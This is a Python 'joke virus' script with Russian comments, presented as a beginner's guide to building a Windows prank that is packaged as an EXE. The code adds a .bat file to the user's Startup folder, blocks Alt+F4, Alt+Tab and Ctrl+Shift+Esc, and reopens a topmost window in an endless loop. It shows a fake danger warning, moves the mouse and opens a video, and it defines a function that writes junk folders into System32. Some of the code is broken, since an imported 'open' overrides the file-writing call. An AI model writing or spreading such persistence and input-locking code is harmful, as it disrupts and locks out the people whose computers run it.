# РУКОВОДСТВО ДЛЯ ЧАЙНИКОВ

# ОТНОСИТСЯ К ОПИСАНИЮ

# когда что-то находится в этих --><-- стрелочках ниже это можно изменять :  print('-->Арсений умный человек и хороший Ютубер<--')


# ТЕГИ
# теги пишутся в круглых скобках (тег)
# тег : изменяемо (роби чего хочешь)
# тег : кодик (желательно изменить под себя)
# тег : неизменяемо (нельзя каким либо образом изменять)
# тег : не удаляемо (можно добавлять но не удалять или изменять это)
# тег : удаляемо (можно[желательно вырезать под корень])
#  над другое: можно удалять, можно изменять

# напиши в консоль для установки необходимых библеотек:
# pip install ctypes, keyboard, PyAutoGUI, pygame, pyinstaller, pywin32-ctypes

# КОД

# импортируем то что надо (изменяемо, не удаляемо)
from ctypes import WinDLL, windll
from time import sleep
from ctypes import wintypes
import os
import keyboard
from random import choice
import pygame
from pyautogui import moveRel
from getpass import getuser
from pygame.draw import *
from webbrowser import open


pygame.init()

# получаем имя пользователя (не изменяемо)
USER_NAME = getuser()
# batnik = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME + r'open.bat'
def Im_stupid_I_cant(screamer=False):
    if screamer == True:
        _PNG_IMAGE = 'download.jpg'
        pygame.display.init()
        img = pygame.image.load(_PNG_IMAGE)
        screen = pygame.display.set_mode(img.get_size(), pygame.FULLSCREEN)
        screen.blit(img, (0, 0))
        pygame.display.flip()
        pygame.quit()
    # os.remove(batnik)
    os.abort()

# функция добавляющаяся в автозагрузку зависит от USER_NAME (не изменяемо)
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

add_to_startup('')

# убиваем chrome(удаляемо, изменяемо), os.system("-->taskkill /IM chrome.exe<--")
# os.system("taskkill /IM chrome.exe")

# блокируем нажатия клавиш(изменяемо), keyboard.add_hotkey("-->alt + f4<--", None suppress=True)
keyboard.add_hotkey("alt + f4", lambda: None, suppress=True)
keyboard.add_hotkey("alt + tab", lambda: None, suppress=True)
keyboard.add_hotkey("Ctrl + Shift + Esc", lambda: None, suppress=True)
keyboard.add_hotkey("Alt + Esc", lambda: None, suppress=True)
keyboard.add_hotkey("Ctrl + Esc", lambda: None, suppress=True)
keyboard.add_hotkey("f1", lambda: None, suppress=True)

# сочетвние клавиш на экстренную остановку программы (изменяемо, удаляемо)
# keyboard.add_hotkey("-->Ctrl + `<--", lambda: os.abort(), suppress=True)
keyboard.add_hotkey("Ctrl + S", lambda: Im_stupid_I_cant(False), suppress=True)


# создание случайного названия (удаляемо, не изменяемо)
def random_name(length):
    number = '0123456789'
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    idshnik = 'joke_'
    for i in range(0, length, 2):
        idshnik += choice(number)
        idshnik += choice(alpha)
    return idshnik


# создание нужного количества папок со случайным названием в папке, os.mkdir(r"-->C:\Windows\System32\\<--" + na)
# зависит от random_name (изменяемо)
def fold(col):
    for i in range(col):
        na = random_name(50)
        os.mkdir(r"C:\Windows\System32\\" + na)


# что нам делать:
# =====================================================================================================================
# создаём картинки (кодик,удаляемо)
# бесконечный цикл ಠ益ಠ
while True:
    # размер и цвет окна
    # размер x, y ; SCREEN = (-->1300, 150<--)
    # цвет (можно в RGB или название цвета), SCREEN_COLOR = -->"white"<--
    SCREEN = (400, 400)
    SCREEN_COLOR = "white"
    # не просят не трогай(по стандарту)
    SCREEN1 = SCREEN[0]
    SCREEN2 = SCREEN[1]
    FPS = 30
    screen = pygame.display.set_mode(SCREEN)
    N = 10
    rect(screen, SCREEN_COLOR, [0, 0, SCREEN1, SCREEN2])
    # если чего-то надо написать или нарисовать
    class my_face:
        class skin:
            circle(screen, color="yellow", radius=150, center=[200, 200])
        class eyes:
            circle(screen, color="red", radius=30, center=[140, 150])
            circle(screen, color="black", radius=15, center=[140, 150])
            circle(screen, color="red", radius=25, center=[260, 150])
            circle(screen, color="black", radius=10, center=[260, 150])
        class brows:
            line(screen, "black", [90, 60], [190, 140], 10)
            line(screen, "black", [200, 140], [300, 90], 10)
        class mouth:
            ellipse(screen, "black", [110, 200, 180, 120])
            ellipse(screen, "yellow", [110, 220, 180, 120])
    # перестань творить
    pygame.display.update()
    clock = pygame.time.Clock()
    finished = False
    hwnd = pygame.display.get_wm_info()['window']
    # делаем поверх других окон
    user32 = WinDLL("user32")
    user32.SetWindowPos.restype = wintypes.HWND
    user32.SetWindowPos.argtypes = [wintypes.HWND, wintypes.HWND, wintypes.INT, wintypes.INT, wintypes.INT,
                                    wintypes.INT, wintypes.UINT]
    user32.SetWindowPos(hwnd, -1, 400, 400, 0, 0, 0x0001)
    # при закрытии окна:
    while not finished:
        clock.tick(FPS)
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                # двигаем мышкой и запускаем рикролл :-) (кодик, удаляемо)
                for u in range(1):
                    try:
                        windll.user32.MessageBoxW(None, "Ну теперь попробуй словить меня!\nСам скачал...\nP.S. если не можешь нажми Ctrl + S", "Ваш компьютер подвергается опасности", 0)
                        open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley', new=0)
                        moveRel(500, 500, duration=0.25)
                        moveRel(-300, -300, duration=0.25)
                    except:
                        pass
                    # не трогай если не удаляешь вывод чего-либо(не изменяемо)
                finished = True
    pygame.quit()
    sleep(300)
# =====================================================================================================================

# для создания EXE файла в консоль пишешь: pyinstaller --onefile --noconsole название_файла.py
# находишь в папке проекта папку dist и вот твой EXE вирус
# план по захвату человечества ГОТОВ на 100%
